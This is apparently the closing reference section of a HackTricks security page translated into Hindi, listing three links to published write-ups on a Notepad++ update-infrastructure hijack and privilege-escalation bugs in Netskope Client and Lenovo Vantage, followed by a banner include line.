- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Netskope Client for Windows में CVE-2025-0309 के fix को Bypass करना](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage में Privilege Escalation Bugs का Uncovering](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
